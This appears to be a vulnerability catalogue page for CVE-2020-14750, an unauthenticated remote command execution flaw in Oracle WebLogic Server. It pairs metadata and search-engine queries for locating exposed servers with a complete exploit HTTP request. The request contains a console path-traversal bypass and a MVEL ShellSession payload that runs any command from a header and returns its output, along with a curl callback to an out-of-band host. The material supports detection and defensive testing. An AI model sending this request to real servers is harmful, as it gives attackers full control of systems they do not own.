---
layout: post
cve_id: CVE-2020-14750
title: Oracle WebLogic Server - Remote Command Execution
pcap: true
pcap_path: /pcaps/2020/CVE-2020-14750.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-14750.yaml
snort2_rule: N/A
snort3_rule: N/A
author: princechaddha,DhiyaneshDk
severity: critical
impact: 'Successful exploitation of this vulnerability allows remote attackers to
  execute arbitrary commands with the privileges of the WebLogic server.

  '
remediation: 'Apply the latest security patches provided by Oracle to mitigate this
  vulnerability.

  '
reference:
- https://github.com/pprietosanchez/CVE-2020-14750
- https://www.oracle.com/security-alerts/alert-cve-2020-14750.html
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14750
- https://nvd.nist.gov/vuln/detail/CVE-2020-14750
- http://packetstormsecurity.com/files/160143/Oracle-WebLogic-Server-Administration-Console-Handle-Remote-Code-Execution.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2020-14750
  epss-score: 0.94438
  epss-percentile: 0.99986
  cpe: cpe:2.3:a:oracle:fusion_middleware:10.3.6.0:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: oracle
  product: fusion_middleware
  shodan-query:
  - http.html:"Weblogic Application Server"
  - http.title:"weblogic"
  - http.html:"weblogic application server"
  fofa-query:
  - title="weblogic"
  - body="weblogic application server"
  google-query: intitle:"weblogic"
tags:
- cve2020
- cve
- rce
- oracle
- weblogic
- unauth
- kev
- packetstorm
- vkev
- vuln
---

## üîç Vulnerability Description
Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised machine without entering necessary credentials. See also CVE-2020-14882, which is addressed in the October 2020 Critical Patch Update.


## üåê HTTP Request
```nohighlight
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363
Connection: close
Content-Length: 1258
Accept: */*
Content-Type: application/x-www-form-urlencoded
cmd: curl d5iv1s1le0o4a561s06gtsutn1fnz6mkp.oast.online
Accept-Encoding: gzip

_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
field.setAccessible(true);
Object obj = field.get(adapter);
weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
String cmd = req.getHeader("cmd");
String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
if (cmd != null) {
    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
    res.getServletOutputStream().flush();
    res.getWriter().write("");
}executeThread.interrupt();
");
```

